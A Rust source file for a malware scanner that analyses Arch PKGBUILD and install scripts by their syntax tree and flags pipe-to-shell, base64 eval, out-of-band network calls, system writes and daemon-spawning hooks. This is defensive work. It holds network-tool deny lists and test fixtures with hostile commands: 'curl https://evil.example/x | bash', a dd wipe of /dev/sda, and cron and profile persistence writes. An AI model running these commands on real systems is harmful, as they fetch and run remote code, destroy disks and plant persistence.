//! Structure-aware PKGBUILD / `.install` analysis via tree-sitter-bash.
//!
//! This detector walks the bash AST to catch *novel* attacks by shape rather
//! than by signature: download-piped-to-shell, eval-of-decoded-content,
//! out-of-band network calls in build phases, writes outside the build dirs,
//! daemon-spawning install hooks, and large opaque blobs. It also emits the
//! PKGBUILD `FeatureVector` (schema v1) that feeds the phase-2 ML corpus.

use aurscan_core::{
    Confidence, Detector, DetectorId, DetectorResult, Evidence, FeatureId, FeatureVector, Finding,
    ScanContext, ScanTarget, ScriptKind, Severity,
};
use tree_sitter::Node;

/// Command names that resolve to a shell interpreter (pipe-to-shell target).
const SHELL_NAMES: &[&str] = &["sh", "bash", "zsh", "dash", "ash"];
/// Commands whose output being piped into a shell is the classic dropper.
const PIPE_SOURCE_NAMES: &[&str] = &["curl", "wget", "fetch", "python", "python3", "perl"];
/// Network-capable commands that do not belong in build phases.
const NETWORK_NAMES: &[&str] = &["curl", "wget", "fetch", "git", "rsync", "scp", "nc", "ncat"];
/// `git` subcommands that operate purely on local state. Deliberately excludes
/// `clone`/`fetch`/`pull`/`push`/`remote`/`ls-remote`/`submodule`/`archive`.
const LOCAL_GIT_SUBCOMMANDS: &[&str] = &[
    "add",
    "am",
    "apply",
    "bisect",
    "blame",
    "branch",
    "cat-file",
    "checkout",
    "cherry-pick",
    "clean",
    "commit",
    "config",
    "describe",
    "diff",
    "format-patch",
    "init",
    "log",
    "merge",
    "mv",
    "rebase",
    "reset",
    "restore",
    "revert",
    "rev-parse",
    "rm",
    "show",
    "sparse-checkout",
    "stash",
    "status",
    "switch",
    "tag",
    "worktree",
];
/// Commands that write files to a destination path.
const WRITE_NAMES: &[&str] = &["cp", "mv", "install", "tee", "dd", "ln"];
/// PKGBUILD / install phases where a bare network fetch is out-of-band.
const NETWORK_PHASES: &[&str] = &[
    "prepare",
    "build",
    "package",
    "post_install",
    "pre_install",
    "post_upgrade",
];
/// Install-hook functions that run as root at package (un)install time.
const INSTALL_HOOK_FNS: &[&str] = &[
    "post_install",
    "pre_install",
    "post_upgrade",
    "pre_upgrade",
    "post_remove",
    "pre_remove",
];
/// Phases where a spawned daemon in an install hook is high-risk.
const DAEMON_PHASES: &[&str] = &["post_install", "post_upgrade"];
/// Substrings that mark a destination path as a legitimate build target.
const SAFE_DEST_MARKERS: &[&str] = &["$pkgdir", "${pkgdir}", "$srcdir", "${srcdir}", "/tmp"];
/// Device nodes that are harmless to *write to*: the write either discards the
/// data or sends it to an already-inherited stream, so nothing on the system
/// is modified. Kept deliberately narrow — most of `/dev` is not safe: writes
/// to block devices (`/dev/sda`, `/dev/nvme0n1`) or kernel memory (`/dev/mem`,
/// `/dev/port`) are wipers, and must keep Blocking.
const SAFE_WRITE_DEVICES: &[&str] = &[
    "/dev/null",
    "/dev/zero",
    "/dev/full",
    "/dev/stdout",
    "/dev/stderr",
    "/dev/tty",
];

pub struct PkgbuildStaticDetector {
    lang: tree_sitter::Language,
}

impl PkgbuildStaticDetector {
    pub fn new() -> Self {
        Self {
            lang: tree_sitter_bash::LANGUAGE.into(),
        }
    }
}

impl Default for PkgbuildStaticDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for PkgbuildStaticDetector {
    fn id(&self) -> DetectorId {
        DetectorId("pkgbuild_static")
    }

    fn wants(&self, target: &ScanTarget) -> bool {
        matches!(
            target,
            ScanTarget::BuildScript {
                kind: ScriptKind::Pkgbuild | ScriptKind::InstallScript | ScriptKind::Other,
                ..
            }
        )
    }

    fn scan(&self, target: &ScanTarget, ctx: &ScanContext) -> DetectorResult {
        let (path, kind) = match target {
            ScanTarget::BuildScript { path, kind } => (path, *kind),
            _ => return DetectorResult::default(),
        };
        let src = match std::fs::read_to_string(path) {
            Ok(s) => s,
            Err(_) => return DetectorResult::default(),
        };
        // `Other` covers every non-script file riding in a clone (.desktop,
        // .json, .conf, ...). Feeding those to a bash parser produced garbage
        // findings: zen-browser's zen.desktop, hundreds of translated
        // Keywords[] lines, misparsed into "strings" and flagged as opaque
        // blobs. Only parse Other targets that are actually shell.
        if matches!(kind, ScriptKind::Other) && !looks_like_shell(path, &src) {
            return DetectorResult::default();
        }
        let location = path.display().to_string();

        let mut parser = tree_sitter::Parser::new();
        if parser.set_language(&self.lang).is_err() {
            return DetectorResult::default();
        }
        let tree = match parser.parse(&src, None) {
            Some(t) => t,
            None => return DetectorResult::default(),
        };

        let mut walker = Walker {
            src: &src,
            kind,
            package: &ctx.package,
            location: &location,
            findings: Vec::new(),
            feat: Features::default(),
        };
        walker.visit(tree.root_node(), None, 0);

        DetectorResult {
            findings: walker.findings,
            features: Some(walker.feat.into_vector(&src, kind)),
        }
    }
}

/// Shannon entropy of a byte slice, in bits per byte.
fn entropy(s: &[u8]) -> f32 {
    if s.is_empty() {
        return 0.0;
    }
    let mut hist = [0u32; 256];
    for &b in s {
        hist[b as usize] += 1;
    }
    let len = s.len() as f32;
    let mut h = 0.0f32;
    for &c in hist.iter() {
        if c > 0 {
            let p = c as f32 / len;
            h -= p * p.log2();
        }
    }
    h
}

/// Strip a single layer of matching surrounding quotes.
fn unquote(s: &str) -> &str {
    let b = s.as_bytes();
    if b.len() >= 2 && (b[0] == b'"' || b[0] == b'\'') && b[b.len() - 1] == b[0] {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

/// True when a string looks like an opaque base64 blob.
fn is_base64ish(s: &str) -> bool {
    let s = s.trim();
    s.len() >= 24
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
}

#[derive(Default)]
struct Features {
    string_entropies: Vec<f32>,
    count_base64ish: u32,
    count_eval: u32,
    count_cmd_subst: u32,
    count_pipes_to_shell: u32,
    count_network: u32,
    count_redirect_system: u32,
    count_chmod_exec: u32,
    depth_max: u32,
    count_functions: u32,
    has_install_hook: bool,
    count_hex_escapes: u32,
}

impl Features {
    fn into_vector(self, src: &str, kind: ScriptKind) -> FeatureVector {
        let mean_entropy = if self.string_entropies.is_empty() {
            0.0
        } else {
            self.string_entropies.iter().sum::<f32>() / self.string_entropies.len() as f32
        };
        let max_entropy = self.string_entropies.iter().copied().fold(0.0f32, f32::max);
        let has_hook = self.has_install_hook || matches!(kind, ScriptKind::InstallScript);
        let file_len = src.len() as u32;
        let max_line = src.lines().map(|l| l.len()).max().unwrap_or(0) as u32;
        FeatureVector {
            schema_version: 1,
            values: vec![
                (FeatureId(0), file_len as f32),
                (FeatureId(1), max_line as f32),
                (FeatureId(2), mean_entropy),
                (FeatureId(3), max_entropy),
                (FeatureId(4), self.count_base64ish as f32),
                (FeatureId(5), self.count_eval as f32),
                (FeatureId(6), self.count_cmd_subst as f32),
                (FeatureId(7), self.count_pipes_to_shell as f32),
                (FeatureId(8), self.count_network as f32),
                (FeatureId(9), self.count_redirect_system as f32),
                (FeatureId(10), self.count_chmod_exec as f32),
                (FeatureId(11), self.depth_max as f32),
                (FeatureId(12), self.count_functions as f32),
                (FeatureId(13), if has_hook { 1.0 } else { 0.0 }),
                (FeatureId(14), self.count_hex_escapes as f32),
            ],
        }
    }
}

struct Walker<'a> {
    src: &'a str,
    kind: ScriptKind,
    package: &'a str,
    location: &'a str,
    findings: Vec<Finding>,
    feat: Features,
}

impl<'a> Walker<'a> {
    fn text(&self, node: Node) -> &'a str {
        node.utf8_text(self.src.as_bytes()).unwrap_or("")
    }

    fn line(&self, node: Node) -> usize {
        node.start_position().row + 1
    }

    fn evidence(&self, node: Node) -> Evidence {
        let mut excerpt = self.text(node).trim().to_string();
        if excerpt.len() > 200 {
            excerpt.truncate(200);
        }
        Evidence {
            location: format!("{}:{}", self.location, self.line(node)),
            excerpt,
        }
    }

    fn push(&mut self, severity: Severity, reason: String, node: Node) {
        let evidence = self.evidence(node);
        self.findings.push(Finding {
            severity,
            confidence: Confidence::Heuristic,
            detector: DetectorId("pkgbuild_static"),
            package: self.package.to_string(),
            reason,
            evidence,
        });
    }

    /// The command-name text of a `command` node, if present.
    fn command_name(&self, node: Node) -> Option<&'a str> {
        node.child_by_field_name("name").map(|n| self.text(n))
    }

    /// Resolved argument texts (quotes stripped) of a `command` node.
    fn arguments(&self, node: Node) -> Vec<&'a str> {
        let mut out = Vec::new();
        let mut cursor = node.walk();
        for child in node.children_by_field_name("argument", &mut cursor) {
            out.push(unquote(self.text(child)));
        }
        out
    }

    /// True when any descendant node has the given kind.
    fn has_descendant_kind(&self, node: Node, kind: &str) -> bool {
        let mut cursor = node.walk();
        let mut stack = vec![node];
        while let Some(n) = stack.pop() {
            if n.kind() == kind {
                return true;
            }
            for c in n.children(&mut cursor) {
                stack.push(c);
            }
        }
        false
    }

    fn visit(&mut self, node: Node, cur_fn: Option<&str>, depth: usize) {
        let kind = node.kind();

        // Track nesting depth of compound statements for the feature vector.
        let child_depth = if kind == "compound_statement" {
            let d = depth + 1;
            self.feat.depth_max = self.feat.depth_max.max(d as u32);
            d
        } else {
            depth
        };

        // Determine the function scope for children.
        let mut child_fn = cur_fn;
        let owned_fn;
        if kind == "function_definition" {
            self.feat.count_functions += 1;
            owned_fn = node.child_by_field_name("name").map(|n| self.text(n));
            if let Some(name) = owned_fn {
                if INSTALL_HOOK_FNS.contains(&name) {
                    self.feat.has_install_hook = true;
                }
                child_fn = Some(name);
            }
        }

        match kind {
            "string" | "raw_string" => self.on_string(node),
            "command_substitution" => self.feat.count_cmd_subst += 1,
            "pipeline" => self.on_pipeline(node, cur_fn),
            "file_redirect" => self.on_redirect(node, cur_fn),
            "command" => self.on_command(node, cur_fn),
            _ => {}
        }

        let mut cursor = node.walk();
        let children: Vec<Node> = node.children(&mut cursor).collect();
        for child in children {
            self.visit(child, child_fn, child_depth);
        }
    }

    fn on_string(&mut self, node: Node) {
        let content = unquote(self.text(node));
        self.feat.string_entropies.push(entropy(content.as_bytes()));
        if is_base64ish(content) {
            self.feat.count_base64ish += 1;
        }
        let hexes = content.matches("\\x").count();
        self.feat.count_hex_escapes += hexes as u32;
        // Large opaque blob: high-entropy long literal or a long hex-escape run.
        let blob_by_entropy = content.len() > 512 && entropy(content.as_bytes()) > 4.5;
        let blob_by_hex = hexes > 20;
        if blob_by_entropy || blob_by_hex {
            self.push(
                Severity::Medium,
                "large opaque blob embedded in build script".to_string(),
                node,
            );
        }
    }

    fn on_pipeline(&mut self, node: Node, cur_fn: Option<&str>) {
        let mut cursor = node.walk();
        let cmds: Vec<Node> = node
            .children(&mut cursor)
            .filter(|c| c.kind() == "command")
            .collect();
        let (Some(first), Some(last)) = (cmds.first(), cmds.last()) else {
            return;
        };
        if cmds.len() < 2 {
            return;
        }
        let first_name = self.command_name(*first).unwrap_or("");
        let last_name = self.command_name(*last).unwrap_or("");
        if SHELL_NAMES.contains(&last_name) && PIPE_SOURCE_NAMES.contains(&first_name) {
            self.feat.count_pipes_to_shell += 1;
            let scope = cur_fn.unwrap_or("script");
            self.push(
                Severity::High,
                format!("{first_name} output piped directly into {last_name} in {scope}()"),
                node,
            );
        }
    }

    fn on_redirect(&mut self, node: Node, cur_fn: Option<&str>) {
        let Some(dest) = node.child_by_field_name("destination") else {
            return;
        };
        let dest_text = unquote(self.text(dest));
        if self.is_system_path(dest_text) {
            self.feat.count_redirect_system += 1;
            let scope = cur_fn.unwrap_or("script");
            self.push(
                Severity::High,
                format!("redirect writes to system path {dest_text} in {scope}()"),
                node,
            );
        }
    }

    fn on_command(&mut self, node: Node, cur_fn: Option<&str>) {
        let Some(name) = self.command_name(node) else {
            return;
        };
        let args = self.arguments(node);

        if name == "eval" {
            self.on_eval(node, cur_fn);
        }

        if name == "chmod" && args.iter().any(|a| a.contains('x') || a.contains('7')) {
            self.feat.count_chmod_exec += 1;
        }

        if NETWORK_NAMES.contains(&name) && !is_local_only_git(name, &args) {
            self.feat.count_network += 1;
            let in_phase = cur_fn.map(|f| NETWORK_PHASES.contains(&f)).unwrap_or(false);
            if in_phase {
                let scope = cur_fn.unwrap_or("script");
                // In `.install` hooks this runs as root at install time.
                let sev = if matches!(self.kind, ScriptKind::InstallScript) {
                    Severity::High
                } else {
                    Severity::Medium
                };
                self.push(
                    sev,
                    format!("out-of-band network call `{name}` in {scope}() (sources belong in source=())"),
                    node,
                );
            }
        }

        if WRITE_NAMES.contains(&name) {
            for dest in write_destinations(name, &args) {
                if self.is_system_path(dest) {
                    let scope = cur_fn.unwrap_or("script");
                    self.push(
                        Severity::High,
                        format!(
                            "`{name}` writes to system path {dest} outside build dirs in {scope}()"
                        ),
                        node,
                    );
                    break;
                }
            }
        }

        if matches!(self.kind, ScriptKind::InstallScript) {
            self.check_daemon_hook(node, name, &args, cur_fn);
        }
    }

    fn on_eval(&mut self, node: Node, cur_fn: Option<&str>) {
        self.feat.count_eval += 1;
        let has_subst = self.has_descendant_kind(node, "command_substitution");
        if !has_subst {
            return;
        }
        let txt = self.text(node);
        let decodes = txt.contains("base64")
            || txt.contains("xxd")
            || txt.contains("openssl enc")
            || txt.contains("\\x")
            || txt.contains("gzip -d")
            || txt.contains("gunzip");
        let scope = cur_fn.unwrap_or("script");
        if decodes {
            self.push(
                Severity::High,
                format!("eval of decoded content (base64/xxd/openssl/hex) in {scope}()"),
                node,
            );
        } else {
            self.push(
                Severity::Medium,
                format!("eval of dynamic command substitution in {scope}()"),
                node,
            );
        }
    }

    fn check_daemon_hook(&mut self, node: Node, name: &str, args: &[&str], cur_fn: Option<&str>) {
        let in_phase = cur_fn.map(|f| DAEMON_PHASES.contains(&f)).unwrap_or(false);
        if !in_phase {
            return;
        }
        let backgrounded = node
            .next_sibling()
            .map(|s| s.kind() == "&")
            .unwrap_or(false);
        let is_daemon = matches!(name, "nohup" | "setsid" | "disown")
            || (name == "systemctl" && args.iter().any(|a| matches!(*a, "enable" | "start")))
            || backgrounded;
        if is_daemon {
            let scope = cur_fn.unwrap_or("script");
            self.push(
                Severity::High,
                format!("install hook spawns/enables a daemon via `{name}` in {scope}()"),
                node,
            );
        }
    }

    /// True when a destination path is an absolute system path that is not a
    /// sanctioned build directory.
    fn is_system_path(&self, dest: &str) -> bool {
        dest.starts_with('/')
            && !SAFE_DEST_MARKERS.iter().any(|m| dest.contains(m))
            && !is_safe_write_device(dest)
    }
}

/// True when a miscellaneous clone file is a shell script: a `.sh`/`.bash`
/// extension, or a shebang whose interpreter is a shell. Everything else
/// (.desktop, .json, .conf, plain data) must not go through the bash parser.
/// ioc_tokens and payload_hashes still scan such files -- exact matchers do
/// not care about syntax.
fn looks_like_shell(path: &std::path::Path, src: &str) -> bool {
    let ext = path
        .extension()
        .map(|e| e.to_ascii_lowercase())
        .unwrap_or_default();
    if ext == "sh" || ext == "bash" {
        return true;
    }
    src.lines()
        .next()
        .is_some_and(|first| first.starts_with("#!") && first.contains("sh"))
}

/// True when a `git` invocation uses a subcommand that cannot reach the
/// network, so it is not an out-of-band fetch.
///
/// `git` earns its place in `NETWORK_NAMES` via `clone`/`fetch`/`pull`, but
/// distro packaging leans on the *local* subcommands constantly: `git apply`
/// and `git cherry-pick` in `prepare()` patch content that `source=()` already
/// fetched. Flagging those blocked nothing but produced Medium noise on
/// `gtk2`, `libsoup` and `lib32-gstreamer`.
///
/// Deny-by-default, matching `is_system_path`: only a *recognized* local
/// subcommand is exempt. An unknown one (or a bare `git`) still counts, so
/// `submodule`, `ls-remote` and anything newly added stay flagged.
fn is_local_only_git(name: &str, args: &[&str]) -> bool {
    if name != "git" {
        return false;
    }
    // Skip leading global flags (`git -C dir apply ...`) to find the verb.
    // `-C`/`-c` take a value, so skip that too.
    let mut it = args.iter().copied();
    let subcommand = loop {
        match it.next() {
            None => return false,
            Some(a) if a == "-C" || a == "-c" => {
                it.next();
            }
            Some(a) if a.starts_with('-') => continue,
            Some(a) => break a,
        }
    };
    LOCAL_GIT_SUBCOMMANDS.contains(&subcommand)
}

/// True when `dest` names a device node that is harmless to write to.
///
/// Note on matching: `SAFE_DEST_MARKERS` uses substring `contains` because
/// `$pkgdir` legitimately appears mid-path. That is the wrong rule here — a
/// substring match would exempt anything merely *containing* a safe node's
/// name (`/dev/null.bak`, or a crafted `/dev/sda` sibling). Device paths are
/// exact, so match them exactly. `/dev/fd/` is the one prefix case: the
/// numbered entries are all inherited descriptors.
fn is_safe_write_device(dest: &str) -> bool {
    SAFE_WRITE_DEVICES.contains(&dest) || dest.starts_with("/dev/fd/")
}

/// True for a short-flag bundle (`-Dm644`) containing `ch`. Case-sensitive:
/// `install -d` creates directories, `-D` creates the destination's parents.
fn short_flag_has(arg: &str, ch: char) -> bool {
    arg.starts_with('-') && !arg.starts_with("--") && arg[1..].contains(ch)
}

/// The operands a write-family command actually writes *to*.
///
/// Checking every argument is wrong: for `install`/`cp`/`mv`/`ln` the leading
/// operands are *sources*, and reading from a system path is ordinary. That
/// mistake blocked real packages -- `install -Dm644 /dev/stdin "$pkgdir/..."`
/// writes inside `$pkgdir` and only *reads* `/dev/stdin` (a heredoc), yet was
/// reported as writing to `/dev/stdin`.
///
/// Destination rules are per-command; there is no single "last argument" rule
/// that holds for all of them.
fn write_destinations<'b>(name: &str, args: &[&'b str]) -> Vec<&'b str> {
    // `dd` names its destination explicitly; every other operand is input.
    if name == "dd" {
        return args.iter().filter_map(|a| a.strip_prefix("of=")).collect();
    }

    let mut operands: Vec<&'b str> = Vec::new();
    let mut explicit_target: Option<&'b str> = None;
    let mut end_of_flags = false;
    let mut iter = args.iter();
    while let Some(arg) = iter.next() {
        if !end_of_flags {
            if *arg == "--" {
                end_of_flags = true;
                continue;
            }
            if let Some(dir) = arg.strip_prefix("--target-directory=") {
                explicit_target = Some(dir);
                continue;
            }
            if *arg == "-t" || *arg == "--target-directory" {
                explicit_target = iter.next().copied();
                continue;
            }
            if arg.starts_with('-') && arg.len() > 1 {
                continue;
            }
        }
        operands.push(arg);
    }

    // `-t DIR` names the destination regardless of operand order.
    if let Some(t) = explicit_target {
        return vec![t];
    }

    match name {
        // Every operand is written to.
        "tee" => operands,
        // `install -d a b c` creates each operand as a directory.
        "install" if args.iter().any(|a| short_flag_has(a, 'd')) => operands,
        // Otherwise the destination is the final operand -- but only when a
        // source is also present. `ln -s /etc/foo` (one operand) links into
        // the current directory; /etc/foo is the target being read.
        _ => {
            if operands.len() >= 2 {
                operands.last().copied().into_iter().collect()
            } else {
                Vec::new()
            }
        }
    }
}

// --- Contract assertions ---
const _: fn() = || {
    fn is_detector<T: aurscan_core::Detector>() {}
    is_detector::<PkgbuildStaticDetector>();
};

#[cfg(test)]
mod tests {
    use super::*;
    use aurscan_core::ScanContext;

    /// Findings mentioning a write to a system path, by message.
    fn write_findings(content: &str) -> Vec<String> {
        scan_str(content, ScriptKind::Pkgbuild)
            .findings
            .into_iter()
            .filter(|f| f.reason.contains("writes to system path"))
            .map(|f| f.reason)
            .collect()
    }

    #[test]
    fn install_from_dev_stdin_into_pkgdir_is_not_a_write_to_dev_stdin() {
        // Regression: worktrunk-bin, a legitimate AUR package, was BLOCKED.
        // /dev/stdin is the heredoc *source*; the destination is inside
        // $pkgdir. Every argument was being checked as if it were a target.
        let got = write_findings(
            "package() {\n  install -Dm644 /dev/stdin \"$pkgdir/usr/share/fish/vendor_completions.d/wt.fish\" <<'EOF'\ncompletions\nEOF\n}\n",
        );
        assert!(got.is_empty(), "expected no write finding, got {got:?}");
    }

    fn scan_other_file(name: &str, content: &str) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join(name);
        std::fs::write(&path, content).unwrap();
        let det = PkgbuildStaticDetector::new();
        let target = ScanTarget::BuildScript {
            path,
            kind: ScriptKind::Other,
        };
        let ctx = ScanContext {
            package: "t".into(),
            version: "1".into(),
            aur_meta: None,
        };
        det.scan(&target, &ctx).findings
    }

    #[test]
    fn desktop_files_are_not_parsed_as_bash() {
        // Regression: zen-browser's zen.desktop (hundreds of translated
        // Keywords[]/Name[] lines) was misparsed by tree-sitter-bash and
        // flagged as opaque blobs, at Medium, twice.
        let translations: String = (0..40)
            .map(|i| format!("Keywords[l{i}]=Ïntérnét;WWW;Bröwsér;Wéb;Éxplörér;çäöü;\n"))
            .collect();
        let got = scan_other_file("zen.desktop", &format!("[Desktop Entry]\n{translations}"));
        assert!(got.is_empty(), "got {got:?}");
    }

    #[test]
    fn shell_helpers_in_a_clone_are_still_parsed() {
        // The Other kind also covers real helper scripts, which must keep
        // being scanned -- by extension or by shebang.
        for name in ["helper.sh", "helper"] {
            let content = if name.ends_with(".sh") {
                "curl https://evil.example/x | bash\n".to_string()
            } else {
                "#!/usr/bin/env bash\ncurl https://evil.example/x | bash\n".to_string()
            };
            let got = scan_other_file(name, &content);
            assert!(
                got.iter().any(|f| f.reason.contains("piped directly")),
                "{name}: got {got:?}"
            );
        }
    }

    #[test]
    fn redirect_to_discard_and_stream_devices_is_not_a_system_write() {
        // Regression: paru, shelly-bin and xrizer -- all top-50 AUR packages --
        // were BLOCKED for `> /dev/null`. Writing to a discard node or an
        // already-inherited stream modifies nothing on the system.
        for script in [
            "build() {\n  make 2>&1 > /dev/null\n}\n",
            "package() {\n  rm -f stale 2>/dev/null\n}\n",
            "prepare() {\n  patch -p1 >/dev/null\n}\n",
            "build() {\n  echo progress > /dev/stderr\n}\n",
            "build() {\n  echo x > /dev/fd/3\n}\n",
        ] {
            let got = write_findings(script);
            assert!(
                got.is_empty(),
                "expected no finding for {script:?}, got {got:?}"
            );
        }
    }

    #[test]
    fn redirect_to_destructive_devices_is_still_flagged() {
        // The exemption must stay narrow: block devices and kernel memory are
        // the wiper targets a scanner exists to catch.
        for dest in ["/dev/sda", "/dev/nvme0n1", "/dev/mem", "/dev/port"] {
            let got = write_findings(&format!("package() {{\n  echo x > {dest}\n}}\n"));
            assert_eq!(got.len(), 1, "expected a finding for {dest}, got {got:?}");
            assert!(got[0].contains(dest), "got {got:?}");
        }
    }

    #[test]
    fn safe_device_match_is_exact_not_substring() {
        // A substring rule would exempt any path merely *containing* a safe
        // node's name, which is a trivial bypass.
        let got = write_findings("package() {\n  echo x > /dev/null.bak\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
    }

    #[test]
    fn install_writing_outside_pkgdir_is_still_flagged() {
        let got = write_findings("package() {\n  install -Dm755 helper /usr/bin/helper\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
        assert!(got[0].contains("/usr/bin/helper"), "got {got:?}");
    }

    #[test]
    fn target_directory_flag_names_the_destination() {
        // `-t DIR src...` inverts the usual operand order.
        let got = write_findings("package() {\n  install -m644 -t /etc/cron.d payload\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
        assert!(got[0].contains("/etc/cron.d"), "got {got:?}");

        // ...and the sources must not be mistaken for targets.
        let safe = write_findings("package() {\n  install -t \"$pkgdir/usr/bin\" /dev/stdin\n}\n");
        assert!(safe.is_empty(), "got {safe:?}");
    }

    #[test]
    fn tee_writes_to_every_operand() {
        let got = write_findings("package() {\n  echo x | tee /etc/profile.d/evil.sh\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
    }

    #[test]
    fn dd_destination_is_its_of_operand() {
        let got = write_findings("package() {\n  dd if=/dev/zero of=/dev/sda bs=1M\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
        assert!(got[0].contains("/dev/sda"), "got {got:?}");
        // if= is the input; it must not be reported as a write target.
        assert!(!got[0].contains("/dev/zero"), "got {got:?}");
    }

    #[test]
    fn single_operand_ln_links_into_cwd_and_is_not_a_system_write() {
        let got = write_findings("package() {\n  ln -s /etc/hosts\n}\n");
        assert!(got.is_empty(), "got {got:?}");

        // Two operands: the link name is the destination.
        let flagged = write_findings("package() {\n  ln -sf /dev/null /etc/resolv.conf\n}\n");
        assert_eq!(flagged.len(), 1, "got {flagged:?}");
        assert!(flagged[0].contains("/etc/resolv.conf"), "got {flagged:?}");
    }

    #[test]
    fn install_d_creates_each_operand_as_a_directory() {
        let got = write_findings("package() {\n  install -dm755 /etc/aurscan.d\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
    }

    #[test]
    fn write_destinations_rules_are_per_command() {
        assert_eq!(
            write_destinations("install", &["-Dm644", "/dev/stdin", "$pkgdir/x"]),
            vec!["$pkgdir/x"]
        );
        assert_eq!(
            write_destinations("cp", &["a", "b", "/usr/lib"]),
            vec!["/usr/lib"]
        );
        assert_eq!(
            write_destinations("tee", &["/etc/a", "/etc/b"]),
            vec!["/etc/a", "/etc/b"]
        );
        assert_eq!(
            write_destinations("dd", &["if=/dev/zero", "of=/dev/sda"]),
            vec!["/dev/sda"]
        );
        assert_eq!(
            write_destinations("mv", &["--", "src", "/etc/dst"]),
            vec!["/etc/dst"]
        );
        assert!(write_destinations("cp", &["only-one"]).is_empty());
    }

    fn scan_str(content: &str, kind: ScriptKind) -> DetectorResult {
        let dir = tempfile::tempdir().unwrap();
        let p = dir.path().join(if kind == ScriptKind::Pkgbuild {
            "PKGBUILD"
        } else {
            "x.install"
        });
        std::fs::write(&p, content).unwrap();
        PkgbuildStaticDetector::new().scan(
            &ScanTarget::BuildScript { path: p, kind },
            &ScanContext {
                package: "t".into(),
                version: "1".into(),
                aur_meta: None,
            },
        )
    }

    #[test]
    fn curl_pipe_sh_in_build_is_high() {
        let r = scan_str(
            "build() {\n  curl -s https://evil.example/x.sh | sh\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn eval_of_base64_decode_is_high() {
        let r = scan_str(
            "prepare() {\n  eval \"$(echo aGk= | base64 -d)\"\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r
            .findings
            .iter()
            .any(|f| f.severity >= Severity::High && f.reason.contains("eval")));
    }

    #[test]
    fn network_in_prepare_is_medium() {
        // sources belong in source=(); a bare curl in prepare() is out-of-band
        let r = scan_str(
            "prepare() {\n  curl -O https://example.com/extra.tar.gz\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::Medium));
    }

    /// Findings about out-of-band network calls, by message.
    fn network_findings(content: &str) -> Vec<String> {
        scan_str(content, ScriptKind::Pkgbuild)
            .findings
            .into_iter()
            .filter(|f| f.reason.contains("out-of-band network call"))
            .map(|f| f.reason)
            .collect()
    }

    #[test]
    fn local_git_subcommands_in_prepare_are_not_network_calls() {
        // Regression: gtk2, libsoup and lib32-gstreamer -- all top-50 AUR
        // packages -- raised Medium findings for patching content that
        // source=() had already fetched.
        for script in [
            "prepare() {\n  git apply -3 ../0001-fix.patch\n}\n",
            "prepare() {\n  git cherry-pick -n 2.74.3..5739a09\n}\n",
            "prepare() {\n  git -C \"$srcdir/gtk\" apply ../0002-fix.patch\n}\n",
            "prepare() {\n  git am ../patches/0001.patch\n}\n",
        ] {
            let got = network_findings(script);
            assert!(
                got.is_empty(),
                "expected no finding for {script:?}, got {got:?}"
            );
        }
    }

    #[test]
    fn network_git_subcommands_are_still_flagged() {
        // The exemption is deny-by-default: fetching subcommands, and any
        // subcommand not recognized as local, still count.
        for script in [
            "prepare() {\n  git clone https://example.com/extra.git\n}\n",
            "prepare() {\n  git fetch origin\n}\n",
            "prepare() {\n  git submodule update --init\n}\n",
            "prepare() {\n  git ls-remote https://example.com/x.git\n}\n",
            "prepare() {\n  git some-future-subcommand\n}\n",
            "prepare() {\n  git\n}\n",
        ] {
            let got = network_findings(script);
            assert_eq!(
                got.len(),
                1,
                "expected a finding for {script:?}, got {got:?}"
            );
        }
    }

    #[test]
    fn local_git_exemption_does_not_leak_to_other_network_commands() {
        // `apply` is a local *git* verb, not a blanket allowlist token.
        let got = network_findings("prepare() {\n  curl apply\n}\n");
        assert_eq!(got.len(), 1, "got {got:?}");
    }

    #[test]
    fn write_outside_pkgdir_is_high() {
        let r = scan_str(
            "package() {\n  cp payload /usr/lib/systemd/system/x.service\n}\n",
            ScriptKind::Pkgbuild,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn install_hook_spawning_daemon_is_high() {
        let r = scan_str(
            "post_install() {\n  systemctl enable --now helper.service\n  nohup /var/lib/.h &\n}\n",
            ScriptKind::InstallScript,
        );
        assert!(r.findings.iter().any(|f| f.severity >= Severity::High));
    }

    #[test]
    fn benign_bin_pkgbuild_stays_below_high() {
        let benign = r#"
pkgname=tool-bin
pkgver=1.0
source=("https://github.com/owner/tool/releases/download/v1.0/tool.tar.gz")
sha256sums=('abc123')
package() {
  install -Dm755 tool "$pkgdir/usr/bin/tool"
}
"#;
        let r = scan_str(benign, ScriptKind::Pkgbuild);
        assert!(r.findings.iter().all(|f| f.severity < Severity::High));
    }

    #[test]
    fn features_always_emitted_with_schema_v1() {
        let r = scan_str("pkgname=x\n", ScriptKind::Pkgbuild);
        let fv = r.features.expect("features");
        assert_eq!(fv.schema_version, 1);
        assert!(fv.values.iter().any(|(id, _)| *id == FeatureId(0)));
    }
}
